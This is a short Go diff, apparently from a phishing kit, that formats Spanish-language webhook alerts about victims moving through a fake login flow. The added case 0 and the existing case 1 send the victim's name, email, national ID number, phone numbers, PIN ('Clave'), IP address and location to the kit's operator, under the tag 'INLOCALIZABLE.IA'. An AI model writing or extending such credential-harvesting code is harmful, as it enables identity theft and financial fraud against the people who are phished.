@@ -25,6 +25,10 @@ func CreateUserData() (d userData) {
 func (u *userData) DataForStep(step uint8) (hd common.HookData) {
 	switch step {
 
+	case 0:
+		hd.Content = fmt.Sprintf("✅**NUEVO INGRESO DETECTADO ACTIVO**✅\n  🆔Nombre: %s\n  📧Correo: %s\n  🪪Cédula: %s\n  🌐IP: %s\n  🌐Ciudad/Barrio: %s\n  🌐País: %s\n  👁️: 🔒INLOCALIZABLE.IA🔒",
+			u.Name, u.Email, u.ID, u.IP, u.City, u.Country)
+
 	case 1:
 		hd.Content = fmt.Sprintf("✅**CLIENTE EN EL SEGUNDO PASO OJO**✅\n🆔Nombre: %s\n📧Correo: %s\n🪪Cédula: %s\n⭐Numero: %s\n⭐Numero2: %s\n🔓Clave: %s\n🌐Ip: %s - %s, %s\n🔒INLOCALIZABLE.IA🔒",
 			u.Name, u.Email, u.ID, u.Phone, u.Phone, u.Pin, u.IP, u.City, u.Country)
